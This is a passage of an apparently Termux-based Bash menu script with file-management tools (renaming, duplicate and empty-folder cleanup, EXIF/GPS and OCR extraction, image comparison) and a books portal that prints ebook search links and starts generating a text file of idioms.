                [[ ! -d "$src" ]] && { printf "  ${RED}Folder not found${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${WH}Pattern:${RESET}\n"
                printf "  ${FADE}[1] YYYY-MM-DD_originalname.ext${RESET}\n"
                printf "  ${FADE}[2] IMG_001, IMG_002, IMG_003...${RESET}\n"
                printf "  ${FADE}[3] prefix_001.ext (custom prefix)${RESET}\n"
                printf "  ${FADE}[4] lowercase all filenames${RESET}\n"
                printf "  ${FADE}[5] Remove spaces (replace with _)${RESET}\n"
                echo ""
                printf "  ${WH}Pattern: ${RESET}"; read -r pat
                printf "  ${WH}File type filter (e.g. jpg, or ENTER for all): ${RESET}"; read -r fext
                echo ""
                local i=1 renamed=0
                local prefix=""
                [[ "$pat" == "3" ]] && { printf "  ${WH}Prefix: ${RESET}"; read -r prefix; }
                while IFS= read -r -d '' f; do
                    local base; base=$(basename "$f")
                    local ext="${base##*.}"; ext="${ext,,}"
                    local dir; dir=$(dirname "$f")
                    local newname=""
                    case "$pat" in
                        1)
                            local dt; dt=$(date -r "$f" '+%Y-%m-%d' 2>/dev/null || date '+%Y-%m-%d')
                            newname="${dt}_${base%.*}.${ext}"
                            ;;
                        2)
                            newname="IMG_$(printf '%03d' $i).${ext}"
                            ;;
                        3)
                            newname="${prefix}_$(printf '%03d' $i).${ext}"
                            ;;
                        4)
                            newname="${base,,}"
                            ;;
                        5)
                            newname="${base// /_}"
                            ;;
                        *) continue ;;
                    esac
                    [[ "$newname" == "$base" ]] && continue
                    local target="$dir/$newname"
                    [[ -f "$target" ]] && target="$dir/${newname%.*}_$(date +%s).${ext}"
                    mv "$f" "$target" 2>/dev/null && ((renamed++)) && ((i++))
                done < <(
                    if [[ -n "$fext" ]]; then
                        find "$src" -maxdepth 1 -type f -iname "*.${fext}" -print0 2>/dev/null
                    else
                        find "$src" -maxdepth 1 -type f -print0 2>/dev/null
                    fi
                )
                printf "  ${GRN}✓ Renamed %s file(s)${RESET}\n" "$renamed"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""
                _dv9
                printf "  ${C9}${BOLD}DUPLICATE FINDER${RESET}\n"
                _dv9
                echo ""
                printf "  ${WH}Folder to scan [ENTER for %s]: ${RESET}" "$WORKDIR"; read -r src
                [[ -z "$src" ]] && src="$WORKDIR"
                src=$(_xpath "$src")
                [[ ! -d "$src" ]] && { printf "  ${RED}Folder not found${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C9}[*] Computing hashes (may take a moment)...${RESET}\n\n"
                declare -A seen_hashes
                local dupes=() dupe_count=0
                while IFS= read -r -d '' f; do
                    local hash; hash=$(md5sum "$f" 2>/dev/null | awk '{print $1}')
                    [[ -z "$hash" ]] && continue
                    if [[ -n "${seen_hashes[$hash]}" ]]; then
                        dupes+=("$f")
                        printf "  ${RED}DUPE${RESET}  %s\n  ${FADE}  ↳ original: %s${RESET}\n\n" "$(basename "$f")" "$(basename "${seen_hashes[$hash]}")"
                        ((dupe_count++))
                    else
                        seen_hashes[$hash]="$f"
                    fi
                done < <(find "$src" -maxdepth 2 -type f -print0 2>/dev/null)
                unset seen_hashes
                echo ""
                if [[ "$dupe_count" -eq 0 ]]; then
                    printf "  ${GRN}✓ No duplicates found${RESET}\n"
                else
                    printf "  ${YEL}Found %s duplicate(s)${RESET}\n\n" "$dupe_count"
                    printf "  ${WH}Delete all duplicates? [y/n]: ${RESET}"; read -r del
                    if [[ "$del" == "y" || "$del" == "Y" ]]; then
                        local deleted=0
                        for f in "${dupes[@]}"; do
                            rm "$f" 2>/dev/null && ((deleted++))
                        done
                        printf "  ${GRN}✓ Deleted %s duplicate(s)${RESET}\n" "$deleted"
                    else
                        printf "  ${FADE}Kept all files — no changes made${RESET}\n"
                    fi
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""
                _dv9
                printf "  ${C9}${BOLD}EMPTY FOLDER CLEANER${RESET}\n"
                _dv9
                echo ""
                printf "  ${WH}Folder to scan [ENTER for %s]: ${RESET}" "$WORKDIR"; read -r src
                [[ -z "$src" ]] && src="$WORKDIR"
                src=$(_xpath "$src")
                [[ ! -d "$src" ]] && { printf "  ${RED}Folder not found${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C9}[*] Scanning for empty folders...${RESET}\n\n"
                local empty_dirs=()
                while IFS= read -r d; do
                    empty_dirs+=("$d")
                    printf "  ${YEL}EMPTY${RESET}  %s\n" "$d"
                done < <(find "$src" -mindepth 1 -type d -empty 2>/dev/null)
                echo ""
                if [[ ${#empty_dirs[@]} -eq 0 ]]; then
                    printf "  ${GRN}✓ No empty folders found${RESET}\n"
                else
                    printf "  ${YEL}Found %s empty folder(s)${RESET}\n\n" "${#empty_dirs[@]}"
                    printf "  ${WH}Delete all? [y/n]: ${RESET}"; read -r del
                    if [[ "$del" == "y" || "$del" == "Y" ]]; then
                        local deleted=0
                        for d in "${empty_dirs[@]}"; do
                            rmdir "$d" 2>/dev/null && ((deleted++))
                        done
                        printf "  ${GRN}✓ Removed %s empty folder(s)${RESET}\n" "$deleted"
                    else
                        printf "  ${FADE}Cancelled — no changes made${RESET}\n"
                    fi
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                _dv9
                printf "  ${C9}${BOLD}SCREENSHOT DETECTOR${RESET}\n"
                _dv9
                echo ""
                printf "  ${WH}Folder to scan [ENTER for %s]: ${RESET}" "$WORKDIR"; read -r src
                [[ -z "$src" ]] && src="$WORKDIR"
                src=$(_xpath "$src")
                [[ ! -d "$src" ]] && { printf "  ${RED}Folder not found${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C9}[*] Detecting screenshots...${RESET}\n\n"
                local found=0
                while IFS= read -r -d '' f; do
                    local base; base=$(basename "$f")
                    local base_lower="${base,,}"
                    local is_ss=0
                    # Name pattern check
                    [[ "$base_lower" == *screenshot* ]] && is_ss=1
                    [[ "$base_lower" == *screen_shot* ]] && is_ss=1
                    [[ "$base_lower" =~ ^img_[0-9]+\.(jpg|jpeg|png)$ ]] && is_ss=0
                    # Resolution check via imagemagick if available
                    if [[ "$is_ss" -eq 0 ]] && command -v identify &>/dev/null; then
                        local dims; dims=$(identify -format "%wx%h" "$f" 2>/dev/null)
                        local w="${dims%%x*}" h="${dims##*x}"
                        # Common screenshot resolutions
                        [[ "$w" == "1080" && ("$h" == "2400" || "$h" == "2340" || "$h" == "1920") ]] && is_ss=1
                    fi
                    if [[ "$is_ss" -eq 1 ]]; then
                        printf "  ${C9}SS${RESET}  %s\n" "$base"
                        ((found++))
                    fi
                done < <(find "$src" -maxdepth 2 -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" \) -print0 2>/dev/null)
                echo ""
                if [[ "$found" -eq 0 ]]; then
                    printf "  ${FADE}No screenshots detected${RESET}\n"
                else
                    printf "  ${WH}%s screenshot(s) found${RESET}\n\n" "$found"
                    printf "  ${WH}Move to screenshots folder? [y/n]: ${RESET}"; read -r mv_ss
                    if [[ "$mv_ss" == "y" || "$mv_ss" == "Y" ]]; then
                        mkdir -p "$src/screenshots" 2>/dev/null
                        local moved=0
                        while IFS= read -r -d '' f; do
                            local base; base=$(basename "$f")
                            local base_lower="${base,,}"
                            [[ "$base_lower" == *screenshot* || "$base_lower" == *screen_shot* ]] && \
                                mv "$f" "$src/screenshots/" 2>/dev/null && ((moved++))
                        done < <(find "$src" -maxdepth 1 -type f \( -iname "*.jpg" -o -iname "*.png" \) -print0 2>/dev/null)
                        printf "  ${GRN}✓ Moved %s screenshot(s) to %s/screenshots/${RESET}\n" "$moved" "$src"
                    fi
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""
                _dv9
                printf "  ${C9}${BOLD}EXIF DATA EXTRACTION${RESET}\n"
                _dv9
                echo ""
                printf "  ${WH}[1] Extract from single file  [2] Batch extract folder  [3] GPS from image${RESET}\n\n"
                printf "  ${WH}Mode: ${RESET}"; read -r em
                case "$em" in
                    1) printf "  ${WH}Image file path: ${RESET}"; read -r efile
                       efile=$(_xpath "$efile")
                       echo ""
                       if command -v exiftool &>/dev/null; then
                           exiftool "$efile" 2>/dev/null | sed 's/^/  /' | less -R
                       else
                           printf "  ${RED}exiftool not found — option [13] to install${RESET}\n"
                       fi ;;
                    2) printf "  ${WH}Folder: ${RESET}"; read -r edir
                       edir=$(_xpath "$edir")
                       [[ ! -d "$edir" ]] && { printf "  ${RED}Not found${RESET}\n"; break; }
                       local exout="$DLDIR/exif_report_$(date +%Y%m%d_%H%M%S).txt"
                       echo ""
                       printf "  ${C9}[*] Extracting EXIF from all images in %s...${RESET}\n\n" "$edir"
                       if command -v exiftool &>/dev/null; then
                           exiftool "$edir"/*.jpg "$edir"/*.png 2>/dev/null > "$exout"
                           printf "  ${GRN}✓ Report saved: %s${RESET}\n" "$exout"
                           cp "$exout" /sdcard/Download/ 2>/dev/null && printf "  ${GRN}✓ Also in /sdcard/Download/${RESET}\n"
                       else
                           printf "  ${RED}exiftool not found — option [13] to install${RESET}\n"
                       fi ;;
                    3) printf "  ${WH}Image file: ${RESET}"; read -r gfile
                       gfile=$(_xpath "$gfile")
                       echo ""
                       if command -v exiftool &>/dev/null; then
                           local lat lng
                           lat=$(exiftool -GPSLatitude -n "$gfile" 2>/dev/null | awk -F': ' '{print $2}')
                           lng=$(exiftool -GPSLongitude -n "$gfile" 2>/dev/null | awk -F': ' '{print $2}')
                           if [[ -n "$lat" && -n "$lng" ]]; then
                               printf "  ${GRN}GPS Latitude : %s${RESET}\n" "$lat"
                               printf "  ${GRN}GPS Longitude: %s${RESET}\n" "$lng"
                               printf "  ${CY}Maps URL: https://maps.google.com/?q=%s,%s${RESET}\n" "$lat" "$lng"
                           else
                               printf "  ${YEL}No GPS data found in this image${RESET}\n"
                           fi
                       else
                           printf "  ${RED}exiftool not found — option [13] to install${RESET}\n"
                       fi ;;
                    *) printf "  ${RED}Invalid${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                echo ""
                _dv9
                printf "  ${C9}${BOLD}OCR TEXT EXTRACTION${RESET}\n"
                _dv9
                echo ""
                printf "  ${WH}[1] Extract text from single image  [2] Batch OCR a folder${RESET}\n\n"
                printf "  ${WH}Mode: ${RESET}"; read -r om
                case "$om" in
                    1) printf "  ${WH}Image file path: ${RESET}"; read -r ofile
                       ofile=$(_xpath "$ofile")
                       [[ ! -f "$ofile" ]] && { printf "  ${RED}File not found${RESET}\n"; break; }
                       local outtxt="${ofile%.*}.txt"
                       echo ""
                       if command -v tesseract &>/dev/null; then
                           printf "  ${C9}[*] Running OCR...${RESET}\n\n"
                           tesseract "$ofile" "${outtxt%.txt}" 2>/dev/null
                           printf "  ${GRN}✓ Text saved: %s${RESET}\n\n" "$outtxt"
                           head -20 "$outtxt" 2>/dev/null | sed 's/^/  /'
                       else
                           printf "  ${RED}tesseract not found — option [13] to install${RESET}\n"
                       fi ;;
                    2) printf "  ${WH}Folder with images: ${RESET}"; read -r odir
                       odir=$(_xpath "$odir")
                       [[ ! -d "$odir" ]] && { printf "  ${RED}Not found${RESET}\n"; break; }
                       echo ""
                       if command -v tesseract &>/dev/null; then
                           local ocr_count=0
                           while IFS= read -r -d '' img; do
                               local outtxt="${img%.*}.txt"
                               tesseract "$img" "${outtxt%.txt}" 2>/dev/null && ((ocr_count++))
                               printf "  ${GRN}✓${RESET} %s\n" "$(basename "$img")"
                           done < <(find "$odir" -maxdepth 1 -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" \) -print0 2>/dev/null)
                           printf "\n  ${GRN}✓ OCR complete — %s file(s) processed${RESET}\n" "$ocr_count"
                       else
                           printf "  ${RED}tesseract not found — option [13] to install${RESET}\n"
                       fi ;;
                    *) printf "  ${RED}Invalid${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            9)
                echo ""
                _dv9
                printf "  ${C9}${BOLD}IMAGE SIMILARITY GROUPING${RESET}\n"
                _dv9
                echo ""
                printf "  ${WH}Folder with images: ${RESET}"; read -r simdir
                simdir=$(_xpath "$simdir")
                [[ ! -d "$simdir" ]] && { printf "  ${RED}Not found${RESET}\n"; sleep 1; continue; }
                echo ""
                if ! command -v compare &>/dev/null; then
                    printf "  ${RED}imagemagick not found — option [13] to install${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                printf "  ${C9}[*] Comparing images (may be slow)...${RESET}\n\n"
                local imgs_list=()
                while IFS= read -r -d '' f; do
                    imgs_list+=("$f")
                done < <(find "$simdir" -maxdepth 1 -type f \( -iname "*.jpg" -o -iname "*.png" \) -print0 2>/dev/null)
                local total=${#imgs_list[@]}
                printf "  ${WH}Comparing %s images...${RESET}\n\n" "$total"
                local sim_count=0
                for ((i=0; i<total; i++)); do
                    for ((j=i+1; j<total; j++)); do
                        local dist; dist=$(compare -metric RMSE "${imgs_list[$i]}" "${imgs_list[$j]}" /dev/null 2>&1 | awk '{print $1}' | cut -d. -f1)
                        if [[ -n "$dist" && "$dist" =~ ^[0-9]+$ && "$dist" -lt 5000 ]]; then
                            printf "  ${C9}SIMILAR${RESET}  %s  ↔  %s  ${FADE}(diff: %s)${RESET}\n" \
                                "$(basename "${imgs_list[$i]}")" "$(basename "${imgs_list[$j]}")" "$dist"
                            ((sim_count++))
                        fi
                    done
                done
                echo ""
                [[ "$sim_count" -eq 0 ]] && printf "  ${GRN}No similar images found${RESET}\n" || printf "  ${WH}%s similar pair(s) found${RESET}\n" "$sim_count"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            10)
                echo ""
                _dv9
                printf "  ${C9}${BOLD}CONFLICT RESOLVER — Auto-rename duplicate filenames${RESET}\n"
                _dv9
                echo ""
                printf "  ${WH}Folder to scan [ENTER for %s]: ${RESET}" "$WORKDIR"; read -r src
                [[ -z "$src" ]] && src="$WORKDIR"
                src=$(_xpath "$src")
                [[ ! -d "$src" ]] && { printf "  ${RED}Not found${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C9}[*] Scanning for filename conflicts...${RESET}\n\n"
                declare -A seen_names
                local conflicts=0
                while IFS= read -r -d '' f; do
                    local base; base=$(basename "$f")
                    if [[ -n "${seen_names[$base]}" ]]; then
                        local ext="${base##*.}"
                        local stem="${base%.*}"
                        local newname="${stem}_$(date +%s%N | tail -c 6).${ext}"
                        local newpath; newpath="$(dirname "$f")/$newname"
                        mv "$f" "$newpath" 2>/dev/null \
                            && printf "  ${GRN}RENAMED${RESET}  %s  →  %s\n" "$base" "$newname" \
                            && ((conflicts++))
                    else
                        seen_names[$base]="$f"
                    fi
                done < <(find "$src" -maxdepth 1 -type f -print0 2>/dev/null | sort -z)
                unset seen_names
                echo ""
                [[ "$conflicts" -eq 0 ]] \
                    && printf "  ${GRN}✓ No conflicts found${RESET}\n" \
                    || printf "  ${GRN}✓ Resolved %s conflict(s)${RESET}\n" "$conflicts"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11)
                echo ""
                _dv9
                printf "  ${C9}${BOLD}PREVIEW BEFORE MOVE — Dry Run${RESET}\n"
                _dv9
                echo ""
                printf "  ${WH}Source folder [ENTER for %s]: ${RESET}" "$WORKDIR"; read -r src
                [[ -z "$src" ]] && src="$WORKDIR"
                src=$(_xpath "$src")
                [[ ! -d "$src" ]] && { printf "  ${RED}Not found${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C9}[DRY RUN] What auto-sort WOULD do to %s:${RESET}\n\n" "$src"
                while IFS= read -r -d '' f; do
                    local base; base=$(basename "$f")
                    local ext="${base##*.}"; ext="${ext,,}"
                    local dest_sub=""
                    case "$ext" in
                        jpg|jpeg|png|gif|webp|bmp|heic|tiff) dest_sub="images" ;;
                        mp4|mkv|avi|mov|webm|flv|3gp) dest_sub="videos" ;;
                        mp3|flac|aac|ogg|wav|m4a|opus) dest_sub="audio" ;;
                        pdf|doc|docx|txt|md|epub|xls|xlsx|ppt|pptx) dest_sub="documents" ;;
                        zip|rar|tar|gz|7z|bz2|xz) dest_sub="archives" ;;
                        sh|py|js|html|css|php|java|c|cpp|rb|go) dest_sub="code" ;;
                        *) dest_sub="other" ;;
                    esac
                    printf "  ${FADE}%-40s${RESET}  ${C9}→${RESET}  ${WH}%s/%s/%s${RESET}\n" "$base" "$(basename "$src")" "$dest_sub" "$base"
                done < <(find "$src" -maxdepth 1 -type f -print0 2>/dev/null)
                echo ""
                printf "  ${WH}Run actual sort now? [y/n]: ${RESET}"; read -r run_now
                if [[ "$run_now" == "y" || "$run_now" == "Y" ]]; then
                    local moved=0
                    while IFS= read -r -d '' f; do
                        local base; base=$(basename "$f")
                        local ext="${base##*.}"; ext="${ext,,}"
                        local dest_sub=""
                        case "$ext" in
                            jpg|jpeg|png|gif|webp|bmp|heic|tiff) dest_sub="images" ;;
                            mp4|mkv|avi|mov|webm|flv|3gp) dest_sub="videos" ;;
                            mp3|flac|aac|ogg|wav|m4a|opus) dest_sub="audio" ;;
                            pdf|doc|docx|txt|md|epub|xls|xlsx|ppt|pptx) dest_sub="documents" ;;
                            zip|rar|tar|gz|7z|bz2|xz) dest_sub="archives" ;;
                            sh|py|js|html|css|php|java|c|cpp|rb|go) dest_sub="code" ;;
                            *) dest_sub="other" ;;
                        esac
                        local dest="$src/$dest_sub"
                        mkdir -p "$dest" 2>/dev/null
                        local target="$dest/$base"
                        [[ -f "$target" ]] && target="$dest/${base%.*}_$(date +%s).${base##*.}"
                        mv "$f" "$target" 2>/dev/null && ((moved++))
                    done < <(find "$src" -maxdepth 1 -type f -print0 2>/dev/null)
                    printf "  ${GRN}✓ Sorted %s file(s)${RESET}\n" "$moved"
                else
                    printf "  ${FADE}Dry run only — no files moved${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            12)
                echo ""
                printf "  ${WH}Set work directory [current: %s]: ${RESET}" "$WORKDIR"; read -r newdir
                newdir=$(_xpath "$newdir")
                if [[ -d "$newdir" ]]; then
                    WORKDIR="$newdir"
                    printf "  ${GRN}✓ Work directory set to: %s${RESET}\n" "$WORKDIR"
                else
                    printf "  ${RED}Not found${RESET}\n"
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            13)
                echo ""
                _dv9
                printf "  ${C9}${BOLD}INSTALL DEPENDENCIES${RESET}\n"
                _dv9
                echo ""
                printf "  ${WH}[1] exiftool — EXIF data extraction${RESET}\n"
                printf "  ${WH}[2] tesseract — OCR text from images${RESET}\n"
                printf "  ${WH}[3] imagemagick — image similarity + manipulation${RESET}\n"
                printf "  ${WH}[4] Install all${RESET}\n\n"
                printf "  ${WH}Choice: ${RESET}"; read -r ic
                echo ""
                case "$ic" in
                    1) pkg install perl perl-image-exiftool -y 2>/dev/null || pkg install exiftool -y
                       printf "  ${GRN}✓ exiftool done${RESET}\n" ;;
                    2) pkg install tesseract-ocr -y
                       printf "  ${GRN}✓ tesseract done${RESET}\n" ;;
                    3) pkg install imagemagick -y
                       printf "  ${GRN}✓ imagemagick done${RESET}\n" ;;
                    4) pkg install perl perl-image-exiftool tesseract-ocr imagemagick -y 2>/dev/null
                       printf "  ${GRN}✓ All dependencies installed${RESET}\n" ;;
                    *) printf "  ${RED}Invalid${RESET}\n" ;;
                esac
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            b|B) return 0 ;;
            m|M) media_station_portal; return ;;
            *) printf "  ${RED}Invalid${RESET}\n"; sleep 0.7 ;;
        esac
    done 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  [10] BOOKS PORTAL
# ═══════════════════════════════════════════════════════════════════

books_portal() {
    while true; do
        clear
        _portal_entry "Books Portal" "${C10}"
        echo ""
        _dv
        printf "  ${C10}${BOLD}BOOKS PORTAL  —  70,000+ Free Classics · Anna's Archive  ${RESET}\n"
        _dv
        echo ""
        printf "  ${WH}gutendex.com · annas-archive.org · ~/storage/downloads/books${RESET}\n"
        printf "  ${FADE}■ Therapist said read more books · downloaded 70,000 of em · never opened one · collection still growing${RESET}\n"
        echo ""
        _dv
        echo ""
        printf "  ${WH}[1] Project Gutenberg — 70,000+ free classics (EPUB/TXT)            ${RESET}\n"
        printf "  ${WH}[2] Open Library — millions of books, borrow or read free           ${RESET}\n"
        printf "  ${WH}[3] Standard Ebooks — beautifully formatted public domain           ${RESET}\n"
        printf "  ${WH}[4] Anna's Archive — widest selection, any genre                    ${RESET}\n"
        printf "  ${WH}[5] Search by author — Gutenberg author lookup                      ${RESET}\n"
        printf "  ${WH}[6] Gutenberg Top 20 — most popular books this week                 ${RESET}\n"
        printf "  ${WH}[7] List downloaded books — count and list books folder            ${RESET}\n"
        printf "  ${WH}[8] Read EPUB in terminal — pick a local EPUB, read via pandoc     ${RESET}\n"
        printf "  ${C10}[9]  Open PDF in Android — pick a downloaded PDF, open native viewer ${RESET}\n"
        printf "  ${C10}[10] Browse & Open — list all books, pick number, open in Android    ${RESET}\n"
        printf "  ${C10}[11] SOI Wisdom Vault — sayings · idioms · phrases · karma wisdom       ${RESET}\n"
        echo ""
        printf "  ${FADE}[b] Back  ·  [m] Main Menu${RESET}\n"
        echo ""
        _dv
        echo ""
        _hover_hint "books"
        echo ""
        printf "  ${C10}${BOLD}Choice » ${RESET}"
        read -r ch
        
        case "$ch" in
            1)
                echo ""; printf "  ${WH}Book title or ID: ${RESET}"; read -r query
                [[ -z "$query" ]] && continue
                echo ""
                printf "  ${C10}[*] Searching Project Gutenberg...${RESET}\n\n"
                printf "  ${WH}Opening: https://www.gutenberg.org/ebooks/search/?query=%s${RESET}\n" "$(echo "$query" | sed 's/ /+/g')"
                printf "  ${FADE}Find book ID, then download with: wget https://www.gutenberg.org/ebooks/[ID].epub.noimages${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            2)
                echo ""; printf "  ${WH}Book title: ${RESET}"; read -r query
                [[ -z "$query" ]] && continue
                echo ""
                printf "  ${C10}[*] Opening Open Library search...${RESET}\n\n"
                printf "  ${WH}URL: https://openlibrary.org/search?q=%s${RESET}\n" "$(echo "$query" | sed 's/ /+/g')"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            3)
                echo ""
                printf "  ${C10}[*] Standard Ebooks collection...${RESET}\n\n"
                printf "  ${WH}URL: https://standardebooks.org/ebooks${RESET}\n"
                printf "  ${FADE}Download EPUB files directly from the site${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            4)
                echo ""; printf "  ${WH}Book title or author: ${RESET}"; read -r query
                [[ -z "$query" ]] && continue
                echo ""
                printf "  ${C10}[*] Opening Anna's Archive search...${RESET}\n\n"
                printf "  ${WH}URL: https://annas-archive.org/search?q=%s${RESET}\n" "$(echo "$query" | sed 's/ /+/g')"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            5)
                echo ""; printf "  ${WH}Author name: ${RESET}"; read -r author
                [[ -z "$author" ]] && continue
                echo ""
                printf "  ${C10}[*] Searching Gutenberg by author...${RESET}\n\n"
                printf "  ${WH}URL: https://www.gutenberg.org/ebooks/author/%s${RESET}\n" "$(echo "$author" | sed 's/ /+/g')"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            6)
                echo ""
                printf "  ${C10}[*] Fetching Gutenberg Top 20...${RESET}\n\n"
                printf "  ${WH}URL: https://www.gutenberg.org/browse/scores/top${RESET}\n"
                printf "  ${FADE}Visit the URL to see most downloaded books this week${RESET}\n"
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            7)
                echo ""
                printf "  ${C10}[*] Books folder contents:${RESET}\n\n"
                local count=$(ls -1 ~/storage/downloads/books/*.{epub,pdf,mobi,txt} 2>/dev/null | wc -l)
                printf "  ${WH}Total books: %s${RESET}\n\n" "$count"
                ls -1 ~/storage/downloads/books/*.{epub,pdf,mobi,txt} 2>/dev/null | head -20 | sed 's|.*/||' | nl -w2 -s". "
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            8)
                clear; echo ""
                _dv
                printf "  ${C10}${BOLD}READ EPUB IN TERMINAL  ·  pandoc + less${RESET}\n"
                _dv; echo ""
                local _epubs=()
                mapfile -t _epubs < <(find ~/storage/downloads/books -name "*.epub" -type f 2>/dev/null | sort)
                if [[ ${#_epubs[@]} -eq 0 ]]; then
                    printf "  ${FADE}No EPUB files found in books folder${RESET}\n"
                    printf "  ${FADE}Download books first with options [1-4]${RESET}\n"
                    echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r; continue
                fi
                printf "  ${WH}%s EPUB(s) found:${RESET}\n\n" "${#_epubs[@]}"
                for _ei in "${!_epubs[@]}"; do
                    printf "  ${C10}%2d.${RESET}  ${WH}%s${RESET}\n" "$((_ei+1))" "$(basename "${_epubs[$_ei]}")"
                done
                echo ""
                printf "  ${WH}Pick number: ${RESET}"; read -r _enum
                [[ -z "$_enum" || ! "$_enum" =~ ^[0-9]+$ ]] && continue
                local _eidx=$(( _enum - 1 ))
                local _epub="${_epubs[$_eidx]}"
                [[ -z "$_epub" || ! -f "$_epub" ]] && { printf "  ${RED}Invalid${RESET}\n"; sleep 1; continue; }
                echo ""
                printf "  ${C10}Opening: %s${RESET}\n\n" "$(basename "$_epub")"
                if command -v pandoc &>/dev/null; then
                    pandoc "$_epub" -t plain 2>/dev/null | less -R
                else
                    printf "  ${YEL}pandoc not installed — install: pkg install pandoc${RESET}\n"
                    printf "  ${FADE}Falling back to unzip text extraction...${RESET}\n\n"
                    unzip -p "$_epub" "*.html" "*.xhtml" 2>/dev/null \
                        | sed 's/<[^>]*>//g; /^[[:space:]]*$/d' \
                        | less
                fi
                echo ""; printf "  ${FADE}Press ENTER...${RESET}"; read -r ;;
            11)
                clear; echo ""
                _dv
                printf "  ${C10}${BOLD}SOI WISDOM VAULT  ·  SAYINGS · PHRASES · KARMA  ·  999${RESET}\n"
                _dv; echo ""
                printf "  ${FADE}Generating vault · saving to books folder...${RESET}\n\n"
                local _wvout="$HOME/storage/downloads/books/SOI_WISDOM_VAULT.txt"
                mkdir -p "$HOME/storage/downloads/books" 2>/dev/null
                python3 - <<'WISDOM_PY'
import os, datetime

OUT = os.path.expanduser("~/storage/downloads/books/SOI_WISDOM_VAULT.txt")

SECTIONS = [
    ("CATCH-22 TYPE — IMPOSSIBLE LOOPS", [
        ("Catch-22",                "You can't get the thing without already having it. Classic impossible loop."),
        ("Paradox",                 "Two things are both true but they contradict each other."),
        ("Circular reasoning",      "Your proof of A uses A. You're going in circles and calling it logic."),
        ("Chicken and the egg",     "No one knows which came first. Both depend on the other to exist."),
        ("Damned if you do, damned if you don't", "Every option gets you punished. There is no safe move."),
        ("The bootstrapping problem","You need money to make money. You need experience to get experience."),
    ]),
    ("HINDSIGHT & PERSPECTIVE", [
        ("Hindsight is 20/20",      "Everything is obvious after it already happened. Easy to see in reverse."),
        ("Monday morning quarterback","Calling the plays after the game is over. Anyone can do that."),
        ("Closing the stable door after the horse has bolted", "Taking action after the damage is already done."),
        ("Can't see the forest for the trees", "Too close to the detail to see the bigger picture."),
        ("The benefit of hindsight", "If we knew then what we know now — but we didn't."),
        ("Rear-view mirror",        "Only clear when you're already past it."),
    ]),
    ("IRONY & KARMA", [
        ("Poetic justice",          "The punishment fits perfectly — almost like the universe designed it."),
        ("Cosmic irony",            "The universe specifically chose YOU for this situation. Congratulations."),
        ("Hoist by your own petard","Destroyed by the trap you built for someone else."),
        ("Bite the hand that feeds you", "Attacking the person or thing keeping you alive."),
        ("Reap what you sow",       "Whatever you put out comes back. No exceptions. No delays — just timing."),
        ("What goes around comes around", "Karma has a long memory and a great sense of timing."),
        ("Sow the wind, reap the whirlwind", "Small bad actions return as catastrophic consequences."),
        ("Be careful what you wish for", "You got exactly what you wanted. Now live with it."),
        ("Self-fulfilling prophecy","You believed it so hard you made it happen yourself."),
        ("Irony of ironies",        "The most ironic possible outcome — and somehow it's the one that happened."),
    ]),
    ("DOUBLE-EDGED & BITTERSWEET", [
        ("Double-edged sword",      "The same thing that helps you also cuts you. Every advantage has a price."),
        ("Pyrrhic victory",         "You won. But what it cost you means you basically lost."),
        ("Bittersweet",             "Happiness and sadness tangled together. Can't have one without the other."),
        ("Mixed blessing",          "Good news that comes with bad news stitched into it."),
        ("Silver lining",           "There is something good hiding inside the bad thing. You have to look for it."),
        ("The flip side",           "Every coin has two sides. You're looking at one. Turn it over."),
        ("Too much of a good thing","Even the best thing becomes poison if you can't stop."),
        ("Gilded cage",             "Beautiful prison. You have everything except the one thing that matters — out."),
    ]),
    ("CIRCLES & PATTERNS", [
        ("Full circle",             "Ends exactly where it started. The journey was the whole point."),
        ("History repeats itself",  "We never learn. The names change. The story stays the same."),
        ("Déjà vu",                 "The feeling you've been here before. Sometimes you actually have been."),
        ("Same circus different clowns", "New situation. Same chaos underneath. You've seen this."),
        ("Meet the new boss same as the old boss", "Change that isn't really change."),
        ("Groundhog day",           "Trapped in a loop. Same day. Same choices. Same result."),
        ("What's old is new again", "Fashion, ideas, people — everything cycles back eventually."),
    ]),
    ("TRUTH & REALITY CHECKS", [
        ("The elephant in the room","Everyone sees it. Nobody's saying it. It's still there."),
        ("The emperor has no clothes","Everyone pretending the lie is real. One honest voice ends it."),
        ("Cutting off your nose to spite your face", "Hurting yourself just to make a point to someone else."),
        ("Throwing pearls before swine", "Giving something valuable to people who can't appreciate it."),
